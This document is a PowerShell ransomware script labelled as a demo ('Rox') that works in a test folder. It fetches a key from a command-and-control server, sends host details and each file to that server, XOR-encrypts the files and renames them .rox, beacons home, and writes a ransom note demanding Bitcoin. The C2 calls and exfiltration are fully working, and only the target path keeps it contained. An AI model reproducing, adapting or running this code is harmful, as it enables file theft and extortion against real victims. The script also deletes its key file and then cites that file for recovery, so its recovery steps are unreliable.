# Test directory setup to avoid affecting real files
$testBaseDir = "C:\Temp\roxDemo"
$testDir = "$testBaseDir\encryptMe"

# Create directories if they don't exist
New-Item -ItemType Directory -Force -Path $testDir | Out-Null

# C2 Configuration
$c2Server = "10.0.0.128"
$ransomNote = "Encrypted by Rox! Visit https://0x4F776C.github.io for payment of 1 BTC."
$base64Url = "http://$c2Server/files/update_key"
$fileExfilUrl = "http://$c2Server/exfil"

# Get payload from C2 server (or use default)
try {
    $base64String = (Invoke-WebRequest -Uri $base64Url -UseBasicParsing).Content
    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64String))
    Write-Host "Retrieved and decoded payload from C2: $decodedPayload" -ForegroundColor Green
} catch {
    Write-Host "Failed to retrieve Base64 payload from C2. Using default simulation." -ForegroundColor Red
    $decodedPayload = "0x4F776C"
}

# Generate XOR key from payload (use first 16 bytes of payload for simplicity)
function Create-KeyFromPayload {
    param([string]$payload)
    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    $key = $payloadBytes[0..15]  # Take first 16 bytes for XOR key
    return $key
}

$xorKey = Create-KeyFromPayload -payload $decodedPayload
$keyFile = "$testBaseDir\xor_key.bin"
[System.IO.File]::WriteAllBytes($keyFile, $xorKey)

# Delete keyFile on disk
Remove-Item -Path $keyFile -Force

# Create some test files if the directory is empty
$fileCount = (Get-ChildItem $testDir -File -Recurse).Count
if ($fileCount -eq 0) {
    Write-Host "Creating test files in $testDir..." -ForegroundColor Yellow
    
    # Create a subdirectory for recursive demo
    $subDir = "$testDir\SubFolder"
    New-Item -ItemType Directory -Force -Path $subDir | Out-Null
    
    # Create test files with content
    "This is test file 1" | Out-File "$testDir\testfile1.txt"
    "This is test file 2" | Out-File "$testDir\testfile2.txt"
    "This is a document in a subfolder" | Out-File "$subDir\document.txt"
}

# Function to transfer file to C2 server
function Transfer-FileToC2 {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [string]$C2Url
    )
    
    try {
        Write-Host "Transferring file $FilePath to C2..." -NoNewline
        
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=""file""; filename=""$fileName""",
            "Content-Type: application/octet-stream$LF",
            [System.Text.Encoding]::ASCII.GetString($fileContent),
            "--$boundary--$LF"
        )
        
        $body = $bodyLines -join $LF
        
        $response = Invoke-WebRequest -Uri $C2Url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -UseBasicParsing
        
        Write-Host " SENT" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host " FAILED" -ForegroundColor Red
        Write-Host "Error transferring file: $_" -ForegroundColor Red
        return $false
    }
}

# Function to XOR encrypt/decrypt a file (XOR is symmetric)
function Xor-File {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,
        [Parameter(Mandatory=$false)]
        [bool]$SendToC2 = $false
    )
    
    try {
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        # Read file content
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Send original file to C2 if requested (before encryption)
        if ($SendToC2) {
            Write-Host " (exfiltrating...)" -NoNewline -ForegroundColor Yellow
            $tempFile = "$testBaseDir\temp_$fileName"
            [System.IO.File]::WriteAllBytes($tempFile, $fileContent)
            $exfilSuccess = Transfer-FileToC2 -FilePath $tempFile -C2Url $fileExfilUrl
            Remove-Item -Path $tempFile -Force
            if (-not $exfilSuccess) {
                Write-Host " (exfiltration failed)" -ForegroundColor Red
            }
        }
        
        # XOR encryption (same operation for encryption and decryption)
        $encryptedData = New-Object byte[] $fileContent.Length
        for ($i = 0; $i -lt $fileContent.Length; $i++) {
            $keyByte = $Key[$i % $Key.Length]
            $encryptedData[$i] = $fileContent[$i] -bxor $keyByte
        }
        
        # Write encrypted data back to file
        [System.IO.File]::WriteAllBytes($FilePath, $encryptedData)
        
        # Rename file to indicate encryption
        $encryptedPath = "$FilePath.rox"
        Rename-Item -Path $FilePath -NewName $encryptedPath -Force
        
        return $true
    }
    catch {
        Write-Host "Error processing $FilePath`: $_" -ForegroundColor Red
        return $false
    }
}

# Function to send system information to C2
function Send-SystemInfoToC2 {
    param(
        [string]$C2Url
    )
    
    try {
        $sysInfo = @{
            ComputerName = $env:COMPUTERNAME
            Username = $env:USERNAME
            Domain = $env:USERDOMAIN
            OSVersion = [System.Environment]::OSVersion.VersionString
            IPAddresses = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress -join ', '
        }
        
        $jsonData = $sysInfo | ConvertTo-Json
        $response = Invoke-WebRequest -Uri "$C2Url/sysinfo" -Method Post -Body $jsonData -ContentType "application/json" -UseBasicParsing
        
        Write-Host "Successfully sent system information to C2" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Failed to send system information: $_" -ForegroundColor Red
        return $false
    }
}

# Main encryption process
Write-Host "DEMO: Starting XOR encryption in $testDir" -ForegroundColor Yellow
Write-Host "Selected files will be transferred to C2 server before encryption" -ForegroundColor Yellow

# Send system information to C2
Send-SystemInfoToC2 -C2Url "http://$c2Server"

# Create a file index to send to C2
$fileIndex = @()
$encryptedFiles = @()

# Select files for exfiltration (all text files for simplicity)
$filesForExfil = Get-ChildItem $testDir -File -Recurse
$filesForExfilPaths = $filesForExfil | ForEach-Object { $_.FullName }

Write-Host "Files selected for exfiltration: $($filesForExfilPaths -join ', ')" -ForegroundColor Cyan

# Process all files
Get-ChildItem $testDir -File -Recurse | ForEach-Object {
    $fileIndex += @{
        Path = $_.FullName
        Size = $_.Length
        Type = $_.Extension
        LastModified = $_.LastWriteTime
        Selected = $filesForExfilPaths -contains $_.FullName
    }
    
    $sendToC2 = $filesForExfilPaths -contains $_.FullName
    
    Write-Host "Encrypting $($_.FullName)..." -NoNewline
    if ($sendToC2) {
        Write-Host " (with exfiltration)" -NoNewline -ForegroundColor Yellow
    }
    
    $success = Xor-File -FilePath $_.FullName -Key $xorKey -SendToC2 $sendToC2
    
    if ($success) {
        Write-Host " DONE" -ForegroundColor Green
        $encryptedFiles += $_.FullName
    }
    else {
        Write-Host " FAILED" -ForegroundColor Red
    }
}

# Send file index to C2
try {
    $jsonIndex = $fileIndex | ConvertTo-Json
    $indexResponse = Invoke-WebRequest -Uri "http://$c2Server/fileindex" -Method Post -Body $jsonIndex -ContentType "application/json" -UseBasicParsing
    Write-Host "Successfully sent file index to C2" -ForegroundColor Green
} catch {
    Write-Host "Failed to send file index to C2: $_" -ForegroundColor Red
}

# Beacon back to C2 server with encrypted file count
try {
    $encryptedCount = $encryptedFiles.Count
    $exfilCount = $filesForExfil.Count
    $beaconUrl = "http://$c2Server/beacon?host=$env:COMPUTERNAME&encrypted=$encryptedCount&exfiltrated=$exfilCount"
    Write-Host "Beaconing to C2 server: $beaconUrl" -ForegroundColor Yellow
    
    Invoke-WebRequest -Uri $beaconUrl -Method GET -UseBasicParsing | Out-Null
    Write-Host "Successfully beaconed to C2 server" -ForegroundColor Green
} catch {
    Write-Host "Failed to beacon to C2 server: $_" -ForegroundColor Red
}

$demoNote = @"
DEMO RANSOM NOTE
----------------
$ransomNote

C2 Payload Used: $decodedPayload
Encrypted Files: $encryptedCount
Files Exfiltrated: $exfilCount
Host: $env:COMPUTERNAME

# Recovery Instructions (for demo only):
1. Use the XOR key saved at: $keyFile
2. Run the Xor-File function on each .rox file to decrypt (XOR is symmetric)
Xor-File -FilePath "path\to\file.rox" -Key ([System.IO.File]::ReadAllBytes("$keyFile"))
"@

Create ransom note (for demonstration)

$noteFile = "$testBaseDir\DEMO_RANSOM_NOTE.txt"
$demoNote | Out-File -FilePath $noteFile

Write-Host "`nXOR encryption demonstration complete with C2 integration and file exfiltration" -ForegroundColor Yellow
Write-Host "Demo ransom note written to: $noteFile" -ForegroundColor Green
Write-Host "Encrypted $encryptedCount files in $testDir" -ForegroundColor Red
Write-Host "Exfiltrated $exfilCount files to C2 server" -ForegroundColor Red